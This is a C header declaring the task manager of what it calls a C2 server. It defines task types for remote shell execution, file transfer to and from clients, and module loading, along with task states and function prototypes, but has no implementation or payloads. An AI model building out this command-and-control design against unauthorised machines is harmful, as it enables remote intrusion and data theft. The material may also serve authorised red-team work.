/**
 * @file task.h
 * @brief Task management system for C2 server
 */

#ifndef DINOC_TASK_H
#define DINOC_TASK_H

#include "common.h"
#include <stdint.h>
#include <stdbool.h>
#include <time.h>

/**
 * @brief Task state enumeration
 */
typedef enum {
    TASK_STATE_CREATED = 0,    // Task has been created but not sent
    TASK_STATE_SENT = 1,       // Task has been sent to client
    TASK_STATE_RUNNING = 2,    // Task is running on client
    TASK_STATE_COMPLETED = 3,  // Task has completed successfully
    TASK_STATE_FAILED = 4,     // Task has failed
    TASK_STATE_TIMEOUT = 5     // Task has timed out
} task_state_t;

/**
 * @brief Task type enumeration
 */
typedef enum {
    TASK_TYPE_SHELL = 0,       // Shell command execution
    TASK_TYPE_DOWNLOAD = 1,    // Download file from client
    TASK_TYPE_UPLOAD = 2,      // Upload file to client
    TASK_TYPE_MODULE = 3,      // Module operation (load, unload, etc.)
    TASK_TYPE_CONFIG = 4,      // Configuration change
    TASK_TYPE_CUSTOM = 5       // Custom task type
} task_type_t;

/**
 * @brief Task structure
 */
typedef struct {
    uuid_t id;                 // Task ID
    uuid_t client_id;          // Client ID
    task_type_t type;          // Task type
    task_state_t state;        // Task state
    uint32_t timeout;          // Timeout in seconds (0 = no timeout)
    time_t created_time;       // Time when task was created
    time_t sent_time;          // Time when task was sent
    time_t start_time;         // Time when task started running
    time_t end_time;           // Time when task completed/failed/timed out
    uint8_t* data;             // Task data
    size_t data_len;           // Task data length
    uint8_t* result;           // Task result
    size_t result_len;         // Task result length
    char* error_message;       // Error message (if any)
} task_t;

/**
 * @brief Initialize task manager
 * 
 * @return status_t Status code
 */
status_t task_manager_init(void);

/**
 * @brief Shutdown task manager
 * 
 * @return status_t Status code
 */
status_t task_manager_shutdown(void);

/**
 * @brief Create a new task
 * 
 * @param client_id Client ID
 * @param type Task type
 * @param data Task data
 * @param data_len Task data length
 * @param timeout Timeout in seconds (0 = no timeout)
 * @param task Pointer to store created task
 * @return status_t Status code
 */
status_t task_create(const uuid_t* client_id, task_type_t type,
                   const uint8_t* data, size_t data_len,
                   uint32_t timeout, task_t** task);

/**
 * @brief Update task state
 * 
 * @param task Task to update
 * @param state New state
 * @return status_t Status code
 */
status_t task_update_state(task_t* task, task_state_t state);

/**
 * @brief Set task result
 * 
 * @param task Task to update
 * @param result Result data
 * @param result_len Result data length
 * @return status_t Status code
 */
status_t task_set_result(task_t* task, const uint8_t* result, size_t result_len);

/**
 * @brief Set task error
 * 
 * @param task Task to update
 * @param error_message Error message
 * @return status_t Status code
 */
status_t task_set_error(task_t* task, const char* error_message);

/**
 * @brief Check if task has timed out
 * 
 * @param task Task to check
 * @return bool True if task has timed out
 */
bool task_is_timed_out(const task_t* task);

/**
 * @brief Destroy a task
 * 
 * @param task Task to destroy
 * @return status_t Status code
 */
status_t task_destroy(task_t* task);

/**
 * @brief Find a task by ID
 * 
 * @param id Task ID
 * @return task_t* Found task or NULL if not found
 */
task_t* task_find(const uuid_t* id);

/**
 * @brief Get tasks for a client
 * 
 * @param client_id Client ID
 * @param tasks Pointer to store tasks array
 * @param count Pointer to store number of tasks
 * @return status_t Status code
 */
status_t task_get_for_client(const uuid_t* client_id, task_t*** tasks, size_t* count);

/**
 * @brief Task timeout thread function
 * 
 * @param arg Thread argument
 * @return void* Thread return value
 */
static void* task_timeout_thread(void* arg);

#endif /* DINOC_TASK_H */
